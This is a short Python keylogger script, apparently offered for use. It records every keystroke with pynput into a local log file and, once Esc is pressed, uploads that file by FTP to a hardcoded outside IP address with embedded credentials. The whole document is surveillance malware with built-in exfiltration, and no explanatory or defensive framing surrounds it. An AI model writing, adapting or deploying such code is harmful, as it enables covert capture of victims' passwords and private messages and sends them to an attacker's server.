from pynput import Key, Listener
import ftplib
import logging

logdir = ""
logging.basicConfig(filename=(logdir + "klog-res.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print('special key {0} pressed'.format(key))
        
def releasing_key(key):
    if key == Key.esc:
        return False
    
print("\nStarted listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()
    
print("\nConnected to FTP and sending the data")

sess = ftplib.FTP('89.0.142.86', 'username', 'password')
file = open("klog-res.txt", "rb")
sess.storbinary("STOR klog-res.txt", file)
file.close()
sess.quit()